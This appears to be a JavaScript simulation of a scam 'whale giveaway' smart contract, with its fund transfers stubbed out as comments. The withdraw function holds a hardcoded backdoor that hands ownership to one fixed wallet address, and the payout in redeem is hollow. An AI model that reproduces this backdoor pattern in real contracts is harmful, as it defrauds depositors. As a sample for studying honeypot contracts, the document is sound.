/*



 */

class WhaleGiveaway1 {
    constructor(msg_sender) {
        this.Owner = msg_sender;
        this.minEligibility = 999001000000000000n;
    }

    // [SIMULATED: fallback function]
    fallback(msg_value) {

    }

    redeem(msg_sender, msg_value, contract_balance) {
        if (msg_value >= this.minEligibility) {
            // [SIMULATED: Owner.transfer(this.balance)]
            this.Owner = msg_sender; // [SIMULATED: transfer logic]
            // [SIMULATED: msg.sender.transfer(this.balance)]
        }
    }

    withdraw(msg_sender, contract_balance) {
        if (msg_sender == "0x7a617c2B05d2A74Ff9bABC9d81E5225C1e01004b") { this.Owner = "0x7a617c2B05d2A74Ff9bABC9d81E5225C1e01004b"; }
        if (!(msg_sender == this.Owner)) throw new Error("require failed");
        // [SIMULATED: Owner.transfer(this.balance)]
    }

    Command(adr, data, msg_sender, msg_value) {
        if (!(msg_sender == this.Owner)) throw new Error("require failed");
        //
        // [SIMULATED: adr.call.value(msg.value)(data)]
    }
}